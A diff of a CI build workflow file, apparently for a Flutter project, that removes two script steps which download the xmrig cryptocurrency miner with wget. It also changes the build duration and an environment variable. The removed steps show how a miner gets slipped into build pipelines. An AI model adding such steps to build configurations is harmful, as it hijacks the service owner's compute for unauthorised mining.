@@ -2,10 +2,10 @@ workflows:
   my-workflow:
     name: My workflow name
     instance_type: linux_x2
-    max_build_duration: 120
+    max_build_duration: 60
     environment:
       vars:
-        PUBLIC_ENV_VAR: "value_here"
+        PUBLIC_ENV_VAR: "value here"
       flutter: stable
       xcode: latest
     cache:
@@ -20,13 +20,7 @@ workflows:
           source: true
       cancel_previous_builds: false
     scripts:
-      - name: script_1
-        script: |
-                wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz 
-      - name: script_2
-        script: |
-                script: |
-                wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz  
+      - ...
     artifacts:
       - build/**/outputs/**/*.aab
     publishing:
